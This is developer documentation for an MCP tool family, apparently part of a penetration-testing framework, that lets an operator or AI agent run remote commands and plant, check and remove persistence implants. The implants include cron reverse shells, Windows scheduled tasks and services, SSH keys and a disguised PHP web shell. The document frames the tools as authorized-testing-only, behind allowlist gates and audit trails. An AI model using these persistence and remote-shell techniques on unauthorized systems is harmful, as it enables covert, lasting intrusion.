---
title: "Tool Family: operator-connection"
sources:
  - tools/mcp_tools/operator_connection.py
  - tools/operator_connection/__init__.py
  - tools/operator_connection/implants.py
  - tools/operator_connection/manager.py
  - tools/api/routes/connections.py
  - tools/config/schema.py
tests:
  - tests/test_connections_api.py
subsystem: mcp
---

# Tool Family: operator-connection

Authorized-testing-only: the operator-facing workflow for a persistent RCE channel against a victim the operator owns or is explicitly authorized to test. The flow is probe (`rce_exec`) → plant a beaconing implant (`establish_persistence`) → enumerate (`list_connections`) → health-check (`check_connection`) → tear down (`remove_persistence`), with explicit operator-side listener control (`rce_listener_start`) and a method catalog (`persistence_catalog`).

- **Registration source:** `tools/mcp_tools/operator_connection.py:83 register_operator_connection_tools(mcp, *, ctx)` — auto-discovered via `collect_tools()`; no edit to `mcp_exploit_server.py` needed.
- **Backing store:** `ConnectionManager` (`tools/operator_connection/manager.py`) persists `ConnectionRecord` rows to `<workspace>/operator_connections.json` plus per-target shards under `<workspace>/connections/<target_ip>.json`, so channels survive restarts. The same manager is exposed over HTTP by `tools/api/routes/connections.py` (which never reads/writes the JSON directly).
- **Implants run ON the victim only.** Every implant is workspace-contained Python the caller must dispatch via `run_python_file` (or the autonomous orchestrator); the operator box never executes victim code and only hosts the listener via `PersistentSessionManager.start_listener`.

## Tools Exported (7)

| Tool | Gate | Params | Result Shape | Notes |
|------|------|--------|--------------|-------|
| `rce_exec` | `@require_allowlist()` + `_target_lock_block(command)` | `target_ip: str`, `command: str`, `technique: str="generic"` | `RCE_EXEC_GATE: passed\nTARGET: ...\nTECHNIQUE: ...\nCOMMAND_SANITIZED: ...\nNEXT: dispatch ... via run_exploit_terminal or write_python_file + run_python_file ...` | Gate + evidence marker, **not** an executor: validates the target, runs `preflight_command_check`, then returns a pass stub telling the caller to dispatch the real probe and plant the beacon with `establish_persistence` on success. `command` capped at 4000 chars. |
| `establish_persistence` | `@require_allowlist()` + callback pivot lock (`check_targets_allowlist([callback_host])`) | `target_ip: str`, `method: str="linux_cron"`, `callback_host: str=""`, `callback_port: int=4444`, `auto_start_listener: bool=True`, `listener_type: str="netcat"` | `PERSISTENCE_ESTABLISHED: <method>\nCONNECTION_ID: ...\nTARGET: ...\nMETHOD: ... (...)\nMITRE: ...\nCALLBACK: host:port\nLISTENER: ... — started/already_running/failed...\nIMPLANT_SCRIPT: <attempt_dir>/implant_<method>_<ip>.py\nATTEMPT_ID: ...\nVERIFY_CMD: ...\nREMOVE_CMD: ...\nNEXT: dispatch ...` | (a) validates target + callback, (b) `render_implant` writes the script into the attempt dir, (c) optionally auto-starts the operator listener, (d) creates the `ConnectionRecord`. Unknown `method` → `BLOCKED` listing all of `IMPLANT_METHODS`. |
| `list_connections` | `@audit_tool` only (local-only, no target touch) | `target_ip: str=""` | `OPERATOR_CONNECTIONS: N total` + per-record status/method/callback/listener/age/last-beacon/last-check/implant-path, or `OPERATOR_CONNECTIONS: none established...` | No `target_ip` lists every connection; with one, filters to that victim. Invalid `target_ip` → `BLOCKED`. |
| `check_connection` | `@require_allowlist()` | `target_ip: str`, `connection_id: str=""`, `method: str=""` | `CONNECTION_CHECK: N channel(s) for <ip>` + per-channel callback/listener state (`RUNNING` / `NOT RUNNING ...`), implant path, `verify ON victim via RCE: <verify_cmd>`, `listener output ON operator: read_listener_output(...)`, plus `NEXT` guidance | Selects by `connection_id` (must belong to `target_ip`), by `method` (active only), or all active for the victim. Listener liveness is probed operator-side via `get_session_manager(workspace).list_all_sessions()`; the verify command itself is returned for the operator to run via RCE. |
| `remove_persistence` | `@require_allowlist()` | `target_ip: str`, `connection_id: str=""`, `method: str=""`, `stop_listener: bool=False` | `REMOVE_PERSISTENCE: N channel(s) for <ip>` + per-channel `remove ON victim via RCE: <remove_cmd>` + listener `stopped` / `left running ...`, plus `NEXT` guidance | Safe default: with only `target_ip` it **lists** removable implants without removing anything. Marks the record `removed` first, then optionally stops the listener (`stop_listener`, falling back to `stop_background_job`). The implant file/cron/service itself is deleted only when the operator runs the returned remove command on the victim. |
| `rce_listener_start` | `@audit_tool` only (binds on the operator box) | `port: int`, `listener_type: str="netcat"`, `name: str=""`, `protocol: str="tcp"` | `RCE_LISTENER_STARTED: <name>\nTYPE: ...\nPORT: port/proto\nPID: ...\nLOG: ...\nNEXT: watch beacons via read_listener_output(...)` or `RCE_LISTENER_FAILED: ...` / `LISTENER_ERROR: ...` | Thin wrapper over `start_listener` defaulting `name` to `persist-beacon-<port>`. `listener_type` must be `netcat|socat|http|tls|https-beacon`; `tls`/`https-beacon` additionally require `exploit.listeners.tls` / `exploit.listeners.https_beacon` to be enabled. `port` must be 1–65535 (numeric strings accepted); `name` must be 1–64 chars. |
| `persistence_catalog` | `@audit_tool` only | `os_filter: str=""` | `PERSISTENCE_CATALOG: N method(s)` + per-method `name  os=...  MITRE...  description (requires root/admin)?` + `verify: <first 80 chars>` + usage line | `os_filter` must be `linux|windows|web|any`; backed by `list_implants` so the catalog never drifts from `implants.py`. |

## Implant Catalog (9 methods)

From `tools/operator_connection/implants.py` (`IMPLANT_METHODS`; each `ImplantSpec` carries `verify_cmd` / `remove_cmd` surfaced in the `PERSISTENCE_ESTABLISHED` block):

| Method | OS | MITRE | Requires root/admin | Beacon cadence | What it plants |
|--------|----|-------|---------------------|----------------|----------------|
| `linux_cron` | linux | T1053.003 | no | every 5 min | Cron entry (`breachpilot-persist` marker) running a `/dev/tcp` reverse shell to the callback |
| `linux_systemd` | linux | T1543.002 | no | always (`Restart=always`, 300 s) | User unit `breachpilot-persist.service` under `~/.config/systemd/user` |
| `linux_ssh_key` | linux | T1098.004 | no | on-demand | ed25519 keypair (`breachpilot_persist_ed25519`) with the pubkey appended to `~/.ssh/authorized_keys` |
| `linux_bashrc` | linux | T1547.004 | no | on interactive login | `~/.bashrc` hook (`# breachpilot-persist` marker) |
| `windows_schtask` | windows | T1053.005 | no | every 5 min | Scheduled task `BreachPilotPersist` (SYSTEM, highest run level) with a PowerShell TCP-client beacon |
| `windows_registry` | windows | T1547.001 | no | on logon | `HKCU\...\Run` value `BreachPilotHealth` |
| `windows_service` | windows | T1543.003 | **yes** | on boot | Auto-start service `BreachPilotSvc` (`sc.exe create ... start= auto`) |
| `windows_startup` | windows | T1547.001 | no | on logon | `BreachPilotHealth.bat` in the Startup folder |
| `web_php_shell` | web | T1505.003 | no | on HTTP request | `systemhealth.php` dropped into common web roots, triggered via the `breachpilot_cmd` request parameter |

`render_implant(name, target_ip, callback_host, callback_port)` substitutes `{target_ip}` / `{callback_host}` / `{callback_port}` (empty host/port render as `<CALLBACK_HOST>` / `4444`); unknown names raise `ValueError`.

## Gates

- **Victim-touching tools are `@require_allowlist()`:** `rce_exec`, `establish_persistence`, `check_connection`, `remove_persistence`. `target_ip` must further pass `validate_target_or_ip`.
- **`rce_exec` command lock:** the free-text `command` additionally passes through `_target_lock_block` (the same gate as `run_exploit_terminal`), so an off-allowlist host inside the probe blocks before the stub is returned.
- **Callback pivot lock:** `callback_host` must pass `check_targets_allowlist` — an implant beaconing to an off-list host is refused. Resolution precedence in `_resolve_callback_host`: explicit `callback_host` → `EXPLOIT_CALLBACK_HOST` env → first entry of `exploit.allowed_targets` → `BLOCKED` (unresolvable). Port precedence in `_callback_port`: explicit non-empty/non-zero value → `EXPLOIT_CALLBACK_PORT` env → `4444`; must be 1–65535.
- **Local-only tools skip the allowlist:** `list_connections`, `rce_listener_start`, `persistence_catalog` are `@audit_tool` only (no target touch; the listener binds on the operator box).
- **Listener auto-start is idempotent:** `establish_persistence` reuses a running listener named `persist-<target-dashes>-<method>` (clamped to 64 chars) instead of starting a duplicate; `listener_type` outside `netcat|socat|http|tls` falls back to `netcat` and is started with `protocol="tcp"`.

Implementation note: the tool-signature defaults (`callback_port=4444`, `auto_start_listener=True`, `listener_type="netcat"`) drive the runtime fallback — not the `operator_connection.default_*` config keys, which are schema/operator metadata. The documented runtime overrides are the `EXPLOIT_CALLBACK_HOST` / `EXPLOIT_CALLBACK_PORT` environment variables.

## Connection Records

`ConnectionRecord` fields: `connection_id` (`conn-` + 8 hex chars), `target_ip`, `method`, `callback_host`, `callback_port`, `listener_name`, `status` (`active|stale|removed|error`, default `active`), `created_at`, `last_beacon`, `last_check`, `check_output` (capped at 2000 chars by `mark_check`), `implant_path`, `mitre_technique`, `os_family`, `notes` (`attempt_id=... auto_listener=...`).

`ConnectionManager` CRUD: `create_connection` (validates `target_ip`; default listener name `persist-<target-dashes>-<method>` clamped to 64 chars) / `list_connections(target_ip="")` / `get(connection_id)` / `find_by_target_method` / `mark_beacon` / `mark_check` / `mark_removed` / `remove` / `summary`. Saves go through a `.tmp` + `os.replace` atomic write. `get_connection_manager(workspace)` is a module singleton that rebinds when called with a different workspace; `reset_connection_manager()` clears it (used by tests).

## Typical flow

```python
# 1. Verify RCE against an authorized victim (gate passes, then dispatch yourself).
rce_exec(target_ip="127.0.0.1", command="whoami; id; hostname", technique="generic")
# NEXT per result: run the sanitized command via run_exploit_terminal.

# 2. Plant a beaconing implant and auto-start the operator listener.
establish_persistence(
    target_ip="127.0.0.1",
    method="linux_cron",
    callback_host="127.0.0.1",
    callback_port=4444,
    auto_start_listener=True,
    listener_type="netcat",
)
# NEXT per result: dispatch IMPLANT_SCRIPT on the victim via run_python_file,
# then verify with check_connection and read_listener_output.

# 3. Health-check, then tear down when the engagement ends.
check_connection(target_ip="127.0.0.1")
remove_persistence(target_ip="127.0.0.1", method="linux_cron", stop_listener=True)
```

## Config

- `operator_connection.enabled: bool` (default true)
- `operator_connection.auto_start_listener: bool` (default true)
- `operator_connection.default_callback_port: int` (default 4444)
- `operator_connection.default_listener_type: str` (default `netcat`)
- `operator_connection.beacon_interval_seconds: int` (default 300)
- `operator_connection.health_check_interval_seconds: int` (default 60)
- `operator_connection.workspace_dir: str` (default `exploit_workspace`)
- `exploit.allowed_targets: list[str]` — feeds the callback pivot lock and the `_resolve_callback_host` fallback
- `exploit.require_explicit_allowlist: bool` — drives `@require_allowlist()`
- `exploit.listeners.tls` / `exploit.listeners.https_beacon: bool` — gate the matching `rce_listener_start` types
- `EXPLOIT_CALLBACK_HOST` / `EXPLOIT_CALLBACK_PORT` env — callback overrides

## Auditing

Victim-touching tools go through `@require_allowlist()` (`started` then `completed|blocked`, blocked flips `approved=False`); local-only tools use `@audit_tool`. The `ConnectionRecord` itself is the durable evidence trail: creation notes carry the `attempt_id`, `mark_check` keeps the last check output, and `mark_removed` preserves the teardown state instead of deleting the row (`remove()` hard-deletes).

## Tests

- `tests/test_connections_api.py` — `ConnectionManager` CRUD exercised through the API routes layer (`get_connection_manager`, per-target shards, `reset_connection_manager`)

Implementation note: no dedicated unit test for `register_operator_connection_tools` was found; coverage of the manager flows through the connections API tests above.

## Related documentation

- [Sessions tool family](./sessions.md) — `PersistentSessionManager` listener backend (`start_listener` / `read_listener_output` / `stop_listener`)
- [Terminal tool family](./terminal.md) — `_target_lock_block` reused by `rce_exec`
- [MCP security](../security.md) — allowlist lock + audit trail
- [MCP registration](../registration.md) — decorator and discovery contract

## Source map

- `tools/mcp_tools/operator_connection.py` — `register_operator_connection_tools`, all 7 tools, `_resolve_callback_host`, `_callback_port`
- `tools/operator_connection/__init__.py` — public re-exports (`ConnectionManager`, `ConnectionRecord`, `IMPLANT_METHODS`, `render_implant`, ...)
- `tools/operator_connection/implants.py` — `ImplantSpec`, `IMPLANT_METHODS` (9 methods), `get_implant`, `list_implants`, `render_implant`
- `tools/operator_connection/manager.py` — `ConnectionRecord`, `ConnectionManager`, `get_connection_manager`, `reset_connection_manager`
- `tools/api/routes/connections.py` — HTTP exposure of the same manager
- `config.yaml` — `operator_connection.*` settings (lines 523-530)
- `tools/config/schema.py` — `operator_connection` schema defaults
